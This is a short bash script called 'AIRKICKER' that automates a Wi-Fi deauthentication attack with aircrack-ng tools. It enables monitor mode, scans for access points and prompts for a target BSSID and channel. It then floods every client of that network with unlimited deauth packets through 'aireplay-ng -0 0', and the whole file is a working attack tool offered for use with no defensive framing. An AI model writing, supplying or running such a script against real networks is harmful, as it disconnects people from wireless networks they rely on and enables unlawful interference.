#!/bin/bash
./figlet -f slant "AIRKICKER"
echo -e "\033[1;32m[*] Granting root permission...\033[0m"
sudo echo -e "\033[1;36m[+] Root permission granted!\033[0m"

sudo airmon-ng
echo -e -n "\033[1;35m[?] Interface name: \033[0m"
read ifn
echo "ifn => $ifn"
sudo airmon-ng start ${ifn}

echo -e "\033[1;32m[+] Searching for sources in 3 seconds, press CTRL-C to stop\033[0m"
sleep 3

tput smcup
sudo airodump-ng ${ifn}mon
tput rmcup

echo -e "\033[1;32m[+] Done!... Please enter source details\033[0m"
echo -e -n "\033[1;35m[?] Source BSSID: \033[0m"
read bssid
echo "bssid => $bssid"
echo -e -n "\033[1;35m[?] Source channel: \033[0m"
read channel
echo "channel => $channel"

echo -e "\033[1;32m[+] Testing source effectiveness in 3 seconds, press CTRL-C to stop\033[0m"
sleep 3

tput smcup
sudo airodump-ng --bssid $bssid -c $channel ${ifn}mon
tput rmcup

echo -e "\033[1;32m[+] Targeting source clients in 3 seconds, press CTRL-C to stop\033[0m"
sleep 3
echo -e "\033[1;32m[*] Running... press CTRL-C to stop\033[1;34m"
sudo aireplay-ng -0 0 -a $bssid -c FF:FF:FF:FF:FF:FF ${ifn}mon
echo -e "\033[0m"
echo "================ "
echo -e "\033[1;36[+] Finished exploiting $bssid with DEAUTH packets\033[0m"

sudo airmon-ng stop ${ifn}mon

echo -e "\033[1;32[!] If you have any issues with WLAN, please restart your networking manager!\033[0m"

